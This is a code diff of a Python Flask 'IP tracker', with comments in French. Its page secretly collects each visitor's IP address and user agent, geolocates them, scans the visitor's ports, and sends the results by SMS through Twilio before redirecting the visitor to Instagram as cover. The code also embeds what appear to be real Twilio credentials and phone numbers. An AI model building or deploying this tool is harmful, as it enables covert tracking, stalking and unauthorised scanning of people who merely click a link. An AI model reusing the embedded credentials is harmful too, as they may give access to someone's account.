@@ -1,65 +1,60 @@
 import socket
-import subprocess
-import os
 import requests
+import threading
 from flask import Flask, request, jsonify
 from twilio.rest import Client
 
 app = Flask(__name__)
 
-# Configuration Twilio
-account_sid = os.getenv('AC2ef2bd5bd5146f76f586d2c577159f90') or 'AC2ef2bd5bd5146f76f586d2c577159f90'  # Remplace avec ton SID Twilio
-auth_token = os.getenv('ab95f4ee6a016c23b123670550a6cde7') or 'ab95f4ee6a016c23b123670550a6cde7'  # Remplace avec ton Token Twilio
-from_number = os.getenv('+12524866318') or '+12524866318'  # Remplace avec ton numéro Twilio                                                               
-to_number = os.getenv('+33635960569') or '+33635960569'  # Remplace avec ton numéro de destination
+# Twilio config
+account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
+auth_token = 'ab95f4ee6a016c23b123670550a6cde7'
+from_number = '+12524866318'
+to_number = '+33635960569'
 
 client = Client(account_sid, auth_token)
 
-# Fonction pour obtenir la géolocalisation basée sur l'IP
 def get_geolocation(ip):
     try:
-        res = requests.get(f"http://ip-api.com/json/{ip}").json()
+        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
         return f"{res['city']}, {res['regionName']}, {res['country']} (ISP: {res['isp']})"
     except:
-        return "Localisation impossible"
+        return "Localisation inconnue"
 
-# Fonction pour scanner les ports ouverts
 def scan_ports(ip, ports=[22, 80, 443, 8080]):
     open_ports = []
     for port in ports:
         try:
             sock = socket.socket()
-            sock.settimeout(0.5)
-            result = sock.connect_ex((ip, port))
-            if result == 0:
+            sock.settimeout(0.3)
+            if sock.connect_ex((ip, port)) == 0:
                 open_ports.append(port)
             sock.close()
         except:
             continue
     return open_ports
 
-# Fonction pour envoyer le SMS via Twilio
 def send_sms(ip, user_agent):
     location = get_geolocation(ip)
     ports = scan_ports(ip)
-    message_body = (
+    msg = (
         f"[IP TRACKER]\n"
         f"IP publique : {ip}\n"
         f"Localisation : {location}\n"
-        f"Ports ouverts : {ports if ports else 'Aucun trouvé'}\n"
+        f"Ports ouverts : {ports or 'Aucun'}\n"
         f"User-Agent : {user_agent}"
     )
     try:
         message = client.messages.create(
-            body=message_body,
+            body=msg,
             from_=from_number,
             to=to_number
         )
-        print(f"[+] SMS envoyé : {message.sid}")
+        print(f"[✓] SMS envoyé : {message.sid}")
     except Exception as e:
         print(f"[!] Erreur envoi SMS : {e}")
 
-# Route d'accueil qui redirige et collecte les informations
+# Redirection rapide avec envoi async
 @app.route('/')
 def index():
     return '''
@@ -72,30 +67,31 @@ def index():
             .then(data => {
                 fetch("/log", {
                     method: "POST",
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         ip: data.ip,
                         ua: navigator.userAgent
                     })
-                }).then(() => {
-                    window.location.href = "https://www.instagram.com";
                 });
+                // Redirection immédiate sans attendre
+                window.location.href = "https://www.instagram.com";
             });
         </script>
     </body>
     </html>
     '''
 
-# Route pour récupérer et traiter les données de l'IP
+# Log reçu et traitement en thread
 @app.route('/log', methods=['POST'])
 def log():
     data = request.get_json()
     ip = data.get('ip')
-    user_agent = data.get('ua')
+    ua = data.get('ua')
     print(f"[+] IP reçue : {ip}")
-    send_sms(ip, user_agent)
+
+    # Async thread
+    threading.Thread(target=send_sms, args=(ip, ua)).start()
+
     return jsonify({"status": "ok"})
 
 if __name__ == '__main__':
